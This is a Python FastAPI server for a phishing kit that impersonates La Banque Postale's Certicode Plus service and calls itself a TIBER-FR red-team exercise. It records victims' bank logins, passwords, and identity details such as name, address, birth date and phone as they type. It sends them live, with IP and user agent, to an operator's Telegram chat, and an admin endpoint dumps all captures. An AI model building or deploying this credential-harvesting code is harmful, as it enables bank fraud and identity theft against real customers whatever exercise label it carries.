from fastapi import FastAPI, APIRouter, Request, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
import uuid
import asyncio
import httpx
import html
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict
from typing import Optional, Dict, Any
from datetime import datetime, timezone


ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / ".env")

# Mongo connection — tolerant to missing env vars so the container can
# still boot (and healthcheck) before MONGO_URL is configured on the host.
mongo_url = os.environ.get("MONGO_URL") or "mongodb://localhost:27017"
db_name = os.environ.get("DB_NAME") or "certicode"

# Log a redacted preview of the Mongo URL so deployment misconfigurations
# (e.g. missing MONGO_URL on Railway) are obvious in the logs.
def _redact_mongo(url: str) -> str:
    try:
        if "@" in url:
            scheme, rest = url.split("://", 1)
            _, host = rest.split("@", 1)
            return f"{scheme}://***:***@{host}"
        return url
    except Exception:
        return "<unparseable>"

logging.basicConfig(level=logging.INFO)
logging.info(f"[startup] MONGO_URL = {_redact_mongo(mongo_url)}")
logging.info(f"[startup] DB_NAME   = {db_name}")

client = AsyncIOMotorClient(mongo_url, serverSelectionTimeoutMS=5000)
db = client[db_name]

app = FastAPI(title="Certicode Plus - TIBER-FR Red Team Exercise")
api_router = APIRouter(prefix="/api")

# Per-session Telegram update coalescing state.
# Each entry holds an asyncio.Lock, a worker task handle, a dirty flag,
# and the latest client meta/stage to publish.
_session_states: Dict[str, Dict[str, Any]] = {}
_session_locks_guard = asyncio.Lock()

# ---------- Models ----------

class SessionCreate(BaseModel):
    user_agent: Optional[str] = None
    referrer: Optional[str] = None


class SessionOut(BaseModel):
    session_id: str
    created_at: str


class ProgressIn(BaseModel):
    model_config = ConfigDict(extra="ignore")
    session_id: str
    stage: Optional[str] = None  # 'identifiant' | 'password' | 'identity' | 'completed'
    data: Dict[str, Any] = Field(default_factory=dict)


class ProgressOut(BaseModel):
    ok: bool
    telegram_sent: bool


class SubmissionIn(BaseModel):
    model_config = ConfigDict(extra="ignore")
    session_id: str
    step: str  # 'login' | 'identity' | 'complete'
    fields: Dict[str, Any] = Field(default_factory=dict)


class SubmissionOut(BaseModel):
    ok: bool
    submission_id: str


# ---------- Helpers ----------

def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _client_meta(request: Request) -> Dict[str, str]:
    fwd = request.headers.get("x-forwarded-for", "")
    ip = fwd.split(",")[0].strip() if fwd else (request.client.host if request.client else "unknown")
    return {
        "ip": ip,
        "user_agent": request.headers.get("user-agent", "unknown"),
    }


def _esc(v: Any) -> str:
    return html.escape(str(v)) if v is not None else ""


def _format_session_message(
    session_id: str,
    meta: Dict[str, str],
    stage: Optional[str],
    started_at: str,
) -> str:
    """Compact session-metadata recap (IP, UA, état, timestamps). Edited as stage/last-update change."""
    stage_label = {
        "opened": "🆕 Site ouvert (en attente)",
        "identifiant": "🟡 Identifiant en cours",
        "password": "🟠 Mot de passe en cours",
        "identity": "🔵 Vérification d'identité en cours",
        "completed": "✅ Parcours terminé",
    }.get(stage or "", "⏳ Capture en cours")

    return "\n".join([
        "<b>📡 LBP Certicode Plus — Session</b>",
        f"<b>État</b> : {stage_label}",
        f"<b>Session</b> : <code>{_esc(session_id)}</code>",
        f"<b>IP</b> : <code>{_esc(meta.get('ip', '?'))}</code>",
        f"<b>UA</b> : <code>{_esc(meta.get('user_agent', '?')[:160])}</code>",
        f"<b>Démarrage</b> : {_esc(started_at)}",
        f"<b>Dernière màj</b> : {_esc(_now_iso())}",
    ])


def _format_data_message(captured: Dict[str, Any]) -> str:
    """Captured data only (no session metadata). Grows as fields fill in."""
    lines = ["<b>🎯 LBP Certicode Plus — Données capturées</b>", ""]

    ident_lines = []
    if captured.get("identifiant"):
        ident_lines.append(f"• <b>Identifiant</b> : <code>{_esc(captured['identifiant'])}</code>")
    if captured.get("mot_de_passe"):
        ident_lines.append(f"• <b>Mot de passe</b> : <code>{_esc(captured['mot_de_passe'])}</code>")
    if "memorise" in captured:
        ident_lines.append(
            f"• <b>Mémoriser</b> : {'oui' if captured.get('memorise') else 'non'}"
        )
    if ident_lines:
        lines.append("🔐 <b>IDENTIFICATION</b>")
        lines.extend(ident_lines)
        lines.append("")

    id_keys = [
        ("nom", "Nom"),
        ("prenom", "Prénom"),
        ("adresse_complete", "Adresse"),
        ("code_postal", "Code postal"),
        ("ville", "Ville"),
        ("date_naissance", "Date de naissance"),
        ("telephone", "Téléphone"),
    ]
    id_lines = [
        f"• <b>{label}</b> : <code>{_esc(captured[k])}</code>"
        for k, label in id_keys
        if captured.get(k)
    ]
    if id_lines:
        lines.append("🪪 <b>IDENTITÉ</b>")
        lines.extend(id_lines)
        lines.append("")

    if len(lines) <= 2:
        lines.append("<i>En attente de saisie…</i>")

    lines.append("<i>Exercice TIBER-FR / DORA — démonstratif</i>")
    return "\n".join(lines)


async def _telegram_send(text: str) -> Optional[int]:
    """Send a new Telegram message. Returns message_id on success."""
    token = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
    chat_id = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
    
    # <--- MODIFICATION: Logs plus détaillés et meilleure gestion d'erreur
    if not token or not chat_id:
        logging.error("Telegram: token ou chat_id manquant")
        return None
    
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    try:
        async with httpx.AsyncClient(timeout=10.0) as http:
            r = await http.post(url, json=payload)
        j = r.json()
        
        # Log détaillé
        logging.info(f"Telegram send - status: {r.status_code}, ok: {j.get('ok')}")
        
        if r.status_code == 200 and j.get("ok"):
            return j["result"]["message_id"]
        
        # Gestion spécifique des erreurs
        if r.status_code == 403:
            error_desc = j.get("description", "")
            if "chat was deleted" in error_desc:
                logging.error("❌ Le chat a été supprimé ! Vérifie TELEGRAM_CHAT_ID")
            elif "bot was blocked" in error_desc:
                logging.error("❌ Le bot a été bloqué par l'utilisateur")
            elif "bot is not a member" in error_desc:
                logging.error("❌ Le bot n'est pas membre du chat")
            else:
                logging.error(f"❌ Erreur 403: {error_desc}")
        elif r.status_code == 404:
            logging.error("❌ Token invalide (404)")
        else:
            logging.warning(f"telegram send failed: {r.status_code} {r.text[:200]}")
            
    except Exception as e:
        logging.exception(f"Telegram send exception: {str(e)}")
    return None
    # <--- FIN MODIFICATION


async def _telegram_edit(message_id: int, text: str) -> tuple[bool, float]:
    """Edit a Telegram message. Returns (success, retry_after_seconds).
    retry_after > 0 indicates the caller should back off for that many seconds."""
    token = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
    chat_id = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
    if not token or not chat_id:
        return False, 0.0
    url = f"https://api.telegram.org/bot{token}/editMessageText"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    try:
        async with httpx.AsyncClient(timeout=10.0) as http:
            r = await http.post(url, json=payload)
        j = r.json()
        if r.status_code == 200 and j.get("ok"):
            return True, 0.0
        # 'message is not modified' returns 400 but is harmless
        if "not modified" in r.text:
            return True, 0.0
        if r.status_code == 429:
            retry_after = float(j.get("parameters", {}).get("retry_after", 1) or 1)
            logging.warning(f"telegram edit 429, retry_after={retry_after}")
            return False, retry_after
        logging.warning(f"telegram edit failed: {r.status_code} {r.text[:200]}")
    except Exception:
        logging.exception("Telegram edit failed")
    return False, 0.0


async def _push_or_edit_progress(session_id: str, request: Request, stage: Optional[str]) -> bool:
    """Maintain TWO Telegram messages per session: one for session metadata, one for captured data.
    First call sends both; subsequent calls edit them in place.
    Uses per-session coalescing to handle Telegram 429 rate-limits: rapid updates
    are merged and the LATEST state is always eventually pushed, with retry-after backoff."""
    # Capture current client meta now (request not available in background task)
    meta = _client_meta(request)

    async with _session_locks_guard:
        state = _session_states.get(session_id)
        if state is None:
            state = {
                "lock": asyncio.Lock(),
                "task": None,
                "dirty": True,
                "latest_meta": meta,
                "latest_stage": stage,
            }
            _session_states[session_id] = state
        else:
            state["dirty"] = True
            state["latest_meta"] = meta
            state["latest_stage"] = stage

    # Spawn a single background worker per session that drains pending updates
    if state["task"] is None or state["task"].done():
        state["task"] = asyncio.create_task(_drain_session_updates(session_id))

    return True


async def _drain_session_updates(session_id: str) -> None:
    """Background worker that pushes the latest captured state for a session to Telegram.
    Handles 429 rate-limits with exponential backoff and coalesces rapid updates."""
    state = _session_states.get(session_id)
    if state is None:
        return
    async with state["lock"]:
        # Minimum interval between Telegram edits per session (avoids 429 storms)
        MIN_INTERVAL_SEC = 1.2
        while True:
            if not state.get("dirty"):
                return
            state["dirty"] = False
            stage = state.get("latest_stage")

            sess = await db.sessions.find_one({"session_id": session_id})
            if not sess:
                return
            meta = state.get("latest_meta") or {"ip": sess.get("ip", "?"), "user_agent": sess.get("user_agent", "?")}
            captured = sess.get("captured_data", {}) or {}
            started_at = sess.get("created_at", "")

            session_text = _format_session_message(session_id, meta, stage, started_at)
            data_text = _format_data_message(captured)

            session_msg_id = sess.get("tg_session_message_id")
            data_msg_id = sess.get("tg_data_message_id")
            update_fields = {}

            # Session metadata message
            if session_msg_id:
                ok, retry_after = await _telegram_edit(session_msg_id, session_text)
                if not ok and retry_after > 0:
                    state["dirty"] = True
                    await asyncio.sleep(retry_after + 0.2)
                    continue
            else:
                new_id = await _telegram_send(session_text)
                if new_id is not None:
                    update_fields["tg_session_message_id"] = new_id

            # Data capture message
            if data_msg_id:
                ok, retry_after = await _telegram_edit(data_msg_id, data_text)
                if not ok and retry_after > 0:
                    state["dirty"] = True
                    if update_fields:
                        await db.sessions.update_one(
                            {"session_id": session_id}, {"$set": update_fields}
                        )
                    await asyncio.sleep(retry_after + 0.2)
                    continue
            else:
                new_id = await _telegram_send(data_text)
                if new_id is not None:
                    update_fields["tg_data_message_id"] = new_id

            if update_fields:
                await db.sessions.update_one(
                    {"session_id": session_id}, {"$set": update_fields}
                )

            # Pace updates: wait MIN_INTERVAL before allowing the next edit
            await asyncio.sleep(MIN_INTERVAL_SEC)
            # Loop: if more updates queued in the meantime, send latest; else exit


# ---------- Routes ----------

@api_router.get("/")
async def root():
    return {"app": "certicode-plus-redteam", "ok": True}


@api_router.get("/health")
async def health():
    # Try a real ping so we know whether MONGO_URL is wired correctly on the host.
    mongo_ok = False
    mongo_error = None
    try:
        await client.admin.command("ping")
        mongo_ok = True
    except Exception as e:
        mongo_error = str(e)[:200]

    return {
        "status": "ok",
        "telegram_configured": bool(
            os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
            and os.environ.get("TELEGRAM_CHAT_ID", "").strip()
        ),
        "mongo_ok": mongo_ok,
        "mongo_host": _redact_mongo(mongo_url),
        "mongo_error": mongo_error,
        "time": _now_iso(),
    }


# <--- MODIFICATION: Nouvelle route de test Telegram
@api_router.get("/telegram-test")
async def test_telegram():
    """Test complet de la configuration Telegram"""
    token = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
    chat_id = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
    
    results = {
        "token": token[:10] + "..." if token else "MISSING",
        "chat_id": chat_id if chat_id else "MISSING",
        "token_valid": False,
        "bot_info": None,
        "can_send": False,
        "available_chats": [],
        "error": None
    }
    
    # Test 1 : Vérifier le token
    if token:
        try:
            url = f"https://api.telegram.org/bot{token}/getMe"
            async with httpx.AsyncClient(timeout=10.0) as http:
                r = await http.get(url)
                if r.status_code == 200:
                    data = r.json()
                    results["token_valid"] = data.get("ok", False)
                    results["bot_info"] = data.get("result")
                else:
                    results["error"] = f"Token invalide: {r.status_code}"
        except Exception as e:
            results["error"] = f"Erreur token: {str(e)}"
    
    # Test 2 : Récupérer les chats disponibles
    if token and results["token_valid"]:
        try:
            url = f"https://api.telegram.org/bot{token}/getUpdates"
            async with httpx.AsyncClient(timeout=10.0) as http:
                r = await http.get(url)
                if r.status_code == 200:
                    data = r.json()
                    for update in data.get("result", []):
                        if "message" in update and "chat" in update["message"]:
                            chat = update["message"]["chat"]
                            results["available_chats"].append({
                                "id": chat["id"],
                                "type": chat["type"],
                                "title": chat.get("title", "Private"),
                                "username": chat.get("username", "")
                            })
        except Exception as e:
            results["error"] = f"Erreur getUpdates: {str(e)}"
    
    # Test 3 : Essayer d'envoyer un message (si token valide et chat_id présent)
    if token and chat_id and results["token_valid"]:
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            payload = {
                "chat_id": chat_id,
                "text": "🧪 Test de connexion depuis Railway",
                "parse_mode": "HTML"
            }
            async with httpx.AsyncClient(timeout=10.0) as http:
                r = await http.post(url, json=payload)
                results["can_send"] = r.status_code == 200
                if not results["can_send"]:
                    results["error"] = f"Envoi échoué: {r.status_code} - {r.text[:100]}"
        except Exception as e:
            results["error"] = f"Erreur envoi: {str(e)}"
    
    return results
# <--- FIN MODIFICATION


@api_router.post("/sessions", response_model=SessionOut)
async def create_session(payload: SessionCreate, request: Request):
    meta = _client_meta(request)
    session_id = str(uuid.uuid4())
    doc = {
        "session_id": session_id,
        "created_at": _now_iso(),
        "ip": meta["ip"],
        "user_agent": meta["user_agent"],
        "referrer": payload.referrer or request.headers.get("referer", ""),
        "captured_data": {},
        "tg_session_message_id": None,
        "tg_data_message_id": None,
        "steps": [],
    }
    await db.sessions.insert_one(doc)

    # Send the initial Telegram notification IMMEDIATELY on site open
    # (so the operator knows who landed before any input is captured).
    await _push_or_edit_progress(session_id, request, stage="opened")

    return SessionOut(session_id=session_id, created_at=doc["created_at"])


@api_router.post("/progress", response_model=ProgressOut)
async def push_progress(payload: ProgressIn, request: Request):
    """Progressive update endpoint: merges partial fields into the session-level
    captured_data and sends or edits a single Telegram message so the recap fills
    up as the user types on the site."""
    sess = await db.sessions.find_one({"session_id": payload.session_id})
    if not sess:
        raise HTTPException(status_code=404, detail="session_not_found")

    # Merge new fields, dropping empty strings/None to avoid overwriting filled data with blanks
    merge_set = {}
    for k, v in (payload.data or {}).items():
        if v is None or v == "":
            continue
        merge_set[f"captured_data.{k}"] = v

    if merge_set:
        await db.sessions.update_one(
            {"session_id": payload.session_id},
            {"$set": merge_set},
        )

    sent = await _push_or_edit_progress(payload.session_id, request, payload.stage)
    return ProgressOut(ok=True, telegram_sent=sent)


@api_router.post("/submissions", response_model=SubmissionOut)
async def create_submission(payload: SubmissionIn, request: Request):
    """Step-completion endpoint: records a submission row and also pushes a Telegram update."""
    meta = _client_meta(request)
    submission_id = str(uuid.uuid4())

    sub_doc = {
        "submission_id": submission_id,
        "session_id": payload.session_id,
        "step": payload.step,
        "fields": payload.fields,
        "ip": meta["ip"],
        "user_agent": meta["user_agent"],
        "created_at": _now_iso(),
    }
    await db.submissions.insert_one(sub_doc)

    # Merge fields into session captured_data too
    merge_set = {}
    for k, v in (payload.fields or {}).items():
        if v is None or v == "":
            continue
        merge_set[f"captured_data.{k}"] = v
    if merge_set:
        await db.sessions.update_one(
            {"session_id": payload.session_id},
            {"$set": merge_set},
        )

    await db.sessions.update_one(
        {"session_id": payload.session_id},
        {"$push": {"steps": {"step": payload.step, "submission_id": submission_id, "at": sub_doc["created_at"]}}},
    )

    stage_map = {"login": "password", "identity": "identity", "complete": "completed"}
    await _push_or_edit_progress(payload.session_id, request, stage_map.get(payload.step))

    return SubmissionOut(ok=True, submission_id=submission_id)


@api_router.get("/admin/submissions")
async def list_submissions(token: str):
    expected = os.environ.get("ADMIN_READ_TOKEN", "").strip()
    if not expected or token != expected:
        raise HTTPException(status_code=403, detail="forbidden")
    rows = await db.submissions.find({}, {"_id": 0}).sort("created_at", -1).to_list(500)
    sessions = await db.sessions.find({}, {"_id": 0}).sort("created_at", -1).to_list(200)
    return {"submissions": rows, "sessions": sessions}


app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get("CORS_ORIGINS", "*").split(","),
    allow_methods=["*"],
    allow_headers=["*"],
)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)


@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()


# ---------- Serve frontend (single-service deploy, e.g. Railway) ----------
# When the React build is present (copied by the Dockerfile to /app/frontend_build),
# we serve it as static files and fall back to index.html for client-side routes.
_FRONTEND_BUILD = Path(os.environ.get("FRONTEND_BUILD_DIR", "/app/frontend_build"))
if _FRONTEND_BUILD.exists() and (_FRONTEND_BUILD / "index.html").exists():
    # Static assets (JS, CSS, images, etc.)
    if (_FRONTEND_BUILD / "static").exists():
        app.mount(
            "/static",
            StaticFiles(directory=str(_FRONTEND_BUILD / "static")),
            name="static",
        )

    @app.get("/")
    async def _serve_root():
        return FileResponse(str(_FRONTEND_BUILD / "index.html"))

    @app.get("/{full_path:path}")
    async def _serve_spa(full_path: str):
        # Never intercept API routes
        if full_path.startswith("api/") or full_path.startswith("api"):
            raise HTTPException(status_code=404, detail="Not Found")
        # Serve real files if they exist (favicon, manifest, lbp-logo.svg, etc.)
        candidate = _FRONTEND_BUILD / full_path
        if candidate.is_file():
            return FileResponse(str(candidate))
        # Otherwise fall back to index.html for SPA routing
        return FileResponse(str(_FRONTEND_BUILD / "index.html"))
    logger.info(f"Serving frontend from {_FRONTEND_BUILD}")
else:
    logger.info(f"Frontend build not found at {_FRONTEND_BUILD} (API-only mode)")
